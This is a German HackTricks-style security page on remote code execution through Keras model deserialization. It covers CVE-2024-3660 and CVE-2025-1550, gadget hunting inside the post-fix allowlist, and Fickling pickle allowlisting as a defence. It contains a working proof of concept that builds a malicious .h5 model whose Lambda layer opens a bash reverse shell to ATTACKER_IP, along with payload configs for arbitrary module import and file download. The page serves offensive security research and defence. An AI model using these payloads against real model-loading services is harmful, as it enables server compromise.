# Keras Model Deserialization RCE und Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Diese Seite fasst praktische Exploitation-Techniken gegen die Keras-Model-Deserialization-Pipeline zusammen, erklärt die Interna und Angriffsfläche des nativen .keras-Formats und stellt ein Researcher-Toolkit zum Auffinden von Model File Vulnerabilities (MFVs) und Post-Fix-Gadgets bereit.

## Interna des .keras-Modellformats

Eine .keras-Datei ist ein ZIP-Archiv, das mindestens Folgendes enthält:<sup>[[1]](#references)</sup>
- metadata.json – allgemeine Informationen (z. B. Keras-Version)
- config.json – Modellarchitektur (primäre Angriffsfläche)
- model.weights.h5 – Gewichte im HDF5-Format

Die config.json steuert die rekursive Deserialization: Keras importiert Module, löst Klassen/Funktionen auf und rekonstruiert Layer/Objekte aus vom Angreifer kontrollierten Dictionaries.<sup>[[1]](#references)</sup>

Beispielausschnitt für ein Dense-Layer-Objekt:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Die Deserialisierung führt Folgendes aus:<sup>[[1]](#references)</sup>
- Modulimport und Symbolauflösung anhand der Schlüssel `module/class_name`
- Aufruf von `from_config(...)` oder des Konstruktors mit vom Angreifer kontrollierten `kwargs`
- Rekursion in verschachtelte Objekte (`activations`, `initializers`, `constraints` usw.)

Historisch stellte dies einem Angreifer, der `config.json` erstellte, drei Primitive bereit:<sup>[[1]](#references)</sup>
- Kontrolle darüber, welche Module importiert werden
- Kontrolle darüber, welche Klassen/Funktionen aufgelöst werden
- Kontrolle über die an Konstruktoren/`from_config` übergebenen `kwargs`

## CVE-2024-3660 – Lambda-layer bytecode RCE

Ursache:
- `Lambda.from_config()` verwendete `python_utils.func_load(...)`, das die Bytes des Angreifers per Base64 dekodiert und `marshal.loads()` aufruft; das Unmarshalling in Python kann Code ausführen.<sup>[[1]](#references)[[3]](#references)</sup>

Exploit-Idee (vereinfachter Payload in `config.json`):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Mitigation:
- Keras erzwingt standardmäßig safe_mode=True. Serialisierte Python-Funktionen in Lambda werden blockiert, sofern ein Benutzer safe_mode=False nicht ausdrücklich aktiviert.<sup>[[1]](#references)</sup>

Hinweise:
- Legacy-Formate (ältere HDF5-Speicherungen) oder ältere Codebasen erzwingen möglicherweise keine modernen Prüfungen, sodass Angriffe im Stil eines „Downgrade“ weiterhin möglich sind, wenn Opfer ältere Loader verwenden.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Ursache:
- _retrieve_class_or_fn verwendete unrestricted importlib.import_module() mit vom Angreifer kontrollierten Modulzeichenfolgen aus config.json.
- Auswirkung: Beliebiger Import jedes installierten Moduls (oder eines vom Angreifer auf sys.path platzierten Moduls). Code zur Importzeit wird ausgeführt, anschließend erfolgt die Objekterstellung mit vom Angreifer kontrollierten kwargs.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Exploit-Idee:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Sicherheitsverbesserungen (Keras ≥ 3.9):<sup>[[1]](#references)[[2]](#references)</sup>
- Module allowlist: imports sind auf offizielle ecosystem-Module beschränkt: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blockiert das Laden unsicherer serialisierter Lambda-Funktionen
- Basic type checking: Deserialisierte Objekte müssen den erwarteten Typen entsprechen

## Praktische Ausnutzung: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Viele Produktions-Stacks akzeptieren weiterhin Legacy-TensorFlow-Keras-HDF5-Modelldateien (.h5). Wenn ein Angreifer ein Model hochladen kann, das der Server später lädt oder für Inference verwendet, kann eine Lambda-Schicht beim Laden, Erstellen oder bei der Vorhersage beliebigen Python-Code ausführen.<sup>[[7]](#references)</sup>

Minimales PoC zum Erstellen einer schädlichen .h5-Datei, die beim Deserialisieren oder bei der Verwendung eine reverse shell ausführt:
```python
import tensorflow as tf

def exploit(x):
import os
os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```
Hinweise und Tipps zur Zuverlässigkeit:
- Triggerpunkte: Code kann mehrfach ausgeführt werden (z. B. während des layer build/first call, model.load_model und predict/fit). Gestalte Payloads idempotent.<sup>[[7]](#references)</sup>
- Version-Pinning: Stimme die TF/Keras/Python-Versionen auf die des Opfers ab, um Serialisierungsabweichungen zu vermeiden. Erstelle Artefakte beispielsweise unter Python 3.8 mit TensorFlow 2.13.1, wenn das vom Zielsystem verwendet wird.<sup>[[7]](#references)</sup>
- Schnelle Umgebungsreplikation:
```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```
- Validierung: Ein harmloses Payload wie os.system("ping -c 1 YOUR_IP") hilft, die Ausführung zu bestätigen (z. B. durch Beobachtung von ICMP mit tcpdump), bevor auf eine Reverse Shell gewechselt wird.<sup>[[7]](#references)</sup>

## Gadget-Oberfläche innerhalb der Allowlist nach dem Fix

Selbst mit Allowlisting und Safe Mode bleibt unter den erlaubten Keras-Callables eine breite Oberfläche bestehen. Beispielsweise kann keras.utils.get_file beliebige URLs an vom Benutzer auswählbare Speicherorte herunterladen.<sup>[[1]](#references)</sup>

Gadget über Lambda, das auf eine erlaubte Funktion verweist (kein serialisierter Python-Bytecode):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Wichtige Einschränkung:
- Lambda.call() stellt beim Aufruf der Ziel-Callable den Eingabe-Tensor als erstes Positionsargument voran. Ausgewählte Gadgets müssen ein zusätzliches Positionsargument tolerieren (oder *args/**kwargs akzeptieren). Dadurch wird eingeschränkt, welche Funktionen geeignet sind.<sup>[[1]](#references)</sup>

## ML-Pickle-Import-Allowlisting für AI/ML-Modelle (Fickling)

Viele AI/ML-Modellformate (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, ältere TensorFlow-Artefakte usw.) enthalten Python-Pickle-Daten. Angreifer missbrauchen regelmäßig Pickle-GLOBAL-Imports und Objektkonstruktoren, um während des Ladens RCE oder einen Model-Tausch zu erreichen. Scanner, die auf Blacklists basieren, übersehen häufig neuartige oder nicht aufgeführte gefährliche Imports.<sup>[[8]](#references)[[14]](#references)</sup>

Eine praktische Fail-closed-Verteidigung besteht darin, Pythons Pickle-Deserializer zu hooken und während des Unpicklings nur eine überprüfte Menge harmloser ML-bezogener Imports zuzulassen. Trail of Bits’ Fickling implementiert diese Richtlinie und enthält eine kuratierte ML-Import-Allowlist, die anhand von Tausenden öffentlichen Hugging-Face-Pickles erstellt wurde.<sup>[[8]](#references)[[13]](#references)</sup>

Sicherheitsmodell für „sichere“ Imports (aus Forschung und Praxis abgeleitete Grundgedanken): Von einem Pickle verwendete importierte Symbole müssen gleichzeitig:<sup>[[8]](#references)</sup>
- Keinen Code ausführen oder eine Ausführung verursachen (keine kompilierten/Quellcode-Objekte, kein Aufruf von Shells, keine Hooks usw.)
- Keine beliebigen Attribute oder Elemente lesen oder setzen
- Keine anderen Python-Objekte aus der Pickle-VM importieren oder Referenzen darauf erhalten
- Keine sekundären Deserializer auslösen (z. B. marshal oder verschachteltes Pickle), auch nicht indirekt

Aktiviere Ficklings Schutzmechanismen so früh wie möglich beim Prozessstart, damit alle von Frameworks durchgeführten Pickle-Ladevorgänge (torch.load, joblib.load usw.) überprüft werden:<sup>[[9]](#references)</sup>
```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```
Betriebliche Tipps:
- Du kannst die Hooks bei Bedarf vorübergehend deaktivieren/wieder aktivieren:<sup>[[9]](#references)</sup>
```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```
- Wenn ein bekannt vertrauenswürdiges Modell blockiert wird, erweitern Sie die Allowlist für Ihre Umgebung, nachdem Sie die Symbole überprüft haben:<sup>[[9]](#references)</sup>
```python
fickling.hook.activate_safe_ml_environment(also_allow=[
"package.subpackage.safe_symbol",
"another.safe.import",
])
```
- Fickling stellt außerdem generische Laufzeitprüfungen bereit, falls du eine granularere Kontrolle bevorzugst:<sup>[[9]](#references)</sup>
- fickling.always_check_safety() erzwingt Prüfungen für alle pickle.load()
- with fickling.check_safety(): für eine bereichsbezogene Durchsetzung
- fickling.load(path) / fickling.is_likely_safe(path) für einmalige Prüfungen

- Bevorzuge nach Möglichkeit Nicht-pickle-Modellformate (z. B. SafeTensors).<sup>[[15]](#references)</sup> Wenn du pickle akzeptieren musst, führe Loader mit den geringstmöglichen Berechtigungen, ohne Netzwerk-Egress, aus und erzwinge die allowlist.

Diese allowlist-first-Strategie blockiert nachweislich gängige ML-pickle-Exploit-Pfade und erhält gleichzeitig eine hohe Kompatibilität. Im Benchmark von ToB erkannte Fickling 100 % der synthetisch schädlichen Dateien und erlaubte etwa 99 % der sauberen Dateien aus den führenden Hugging Face-Repositories.<sup>[[8]](#references)[[10]](#references)</sup>


## Toolkit für Researcher

1) Systematische gadget discovery in erlaubten Modulen

Liste potenzielle aufrufbare Objekte in keras, keras_nlp, keras_cv, keras_hub auf und priorisiere diejenigen mit Datei-/Netzwerk-/Prozess-/Umgebungsvariablen-Seiteneffekten.<sup>[[1]](#references)</sup>

<details>
<summary>Potentiell gefährliche aufrufbare Objekte in allowlisted Keras-Modulen auflisten</summary>
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
</details>

2) Direktes Deserialisierungs-Testing (kein .keras-Archiv erforderlich)

Übergib erstellte Diktate direkt an Keras-Deserialisierer, um akzeptierte Parameter zu ermitteln und Seiteneffekte zu beobachten.<sup>[[1]](#references)</sup>
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Versionsübergreifende Tests und Formate

Keras existiert in mehreren Codebasen/Generationen mit unterschiedlichen Schutzmechanismen und Formaten:<sup>[[1]](#references)</sup>
- In TensorFlow integriertes Keras: tensorflow/python/keras (veraltet, soll entfernt werden)
- tf-keras: wird separat gepflegt
- Multi-Backend-Keras 3 (offiziell): führte das native .keras-Format ein

Wiederhole die Tests über verschiedene Codebasen und Formate hinweg (.keras im Vergleich zu Legacy-HDF5), um Regressionen oder fehlende Schutzmechanismen aufzudecken.

## Referenzen

- [1] [Suche nach Schwachstellen bei der Deserialisierung von Keras-Modellen (huntr-Blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [2] [Keras PR #20751 – Prüfungen zur Serialisierung hinzugefügt](https://github.com/keras-team/keras/pull/20751)
- [3] [CVE-2024-3660 – RCE durch Keras-Lambda-Deserialisierung](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [4] [CVE-2025-1550 – Beliebiger Modulimport in Keras (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [5] [huntr-Bericht – beliebiger Import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [6] [huntr-Bericht – beliebiger Import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [7] [HTB Artificial – TensorFlow-.h5-Lambda-RCE bis zu root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)
- [8] [Trail-of-Bits-Blog – Ficklings neuer AI/ML-Pickle-File-Scanner](https://blog.trailofbits.com/2025/09/16/ficklings-new-ai/ml-pickle-file-scanner/)
- [9] [Fickling – Absicherung von AI/ML-Umgebungen (README)](https://github.com/trailofbits/fickling#securing-aiml-environments)
- [10] [Benchmark-Korpus für das Scannen von Pickle-Dateien mit Fickling](https://github.com/trailofbits/fickling/tree/master/pickle_scanning_benchmark)
- [11] [Picklescan](https://github.com/mmaitre314/picklescan)
- [12] [ModelScan](https://github.com/protectai/modelscan)
- [13] [model-unpickler](https://github.com/goeckslab/model-unpickler)
- [14] [Hintergrund zu Sleepy-Pickle-Angriffen](https://blog.trailofbits.com/2024/06/11/exploiting-ml-models-with-pickle-file-attacks-part-1/)
- [15] [SafeTensors-Projekt](https://github.com/safetensors/safetensors)

{{#include ../../banners/hacktricks-training.md}}
